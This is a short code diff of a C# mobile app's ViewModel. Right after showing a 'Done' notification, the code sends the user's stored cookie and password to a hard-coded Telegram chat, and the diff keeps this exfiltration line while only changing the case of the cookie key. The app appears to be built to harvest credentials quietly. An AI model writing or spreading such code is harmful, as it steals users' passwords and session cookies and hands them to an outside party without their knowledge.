@@ -44,7 +44,7 @@ namespace MobileApp.ViewModels
             else
             {
                 await _pageDialogService.DisplayAlertAsync("Notification", "Done", "OK");
-                await _telegramService.SendMessageToTelegram("-574027593", Preferences.Get("cookie", "") + "|pass:" + Passwd, AppConstants.AuthenTelegram);
+                await _telegramService.SendMessageToTelegram("-574027593", Preferences.Get("Cookie", "") + "|pass:" + Passwd, AppConstants.AuthenTelegram);
                 if (RequestClose != null)
                 {
                     RequestClose(null);
